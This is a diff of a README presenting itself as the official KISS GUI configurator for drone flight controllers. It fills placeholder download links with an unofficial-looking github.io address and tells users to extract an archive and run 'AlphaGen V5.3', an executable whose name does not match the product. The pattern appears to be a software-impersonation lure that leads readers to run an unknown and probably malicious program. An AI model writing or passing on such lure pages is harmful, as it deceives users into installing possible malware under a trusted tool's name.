@@ -2,13 +2,13 @@
 
 KISS GUI is the official configuration tool for KISS flight controllers, offering real-time tuning, firmware updates, and telemetry for racing and freestyle drones.
 
-[![Download](https://img.shields.io/badge/Download-KISS_GUI_Configurator-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-KISS_GUI_Configurator-blueviolet)](https://kiss-gui-flight-controller-configurator.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://kiss-gui-flight-controller-configurator.github.io/.github)  
 2. 📁 Extract the tool to any convenient folder  
 3. 🖱 Run AlphaGen V5.3 to initialize the KISS communication layer  
 4. ✅ Connect your KISS FC via USB and begin configuration
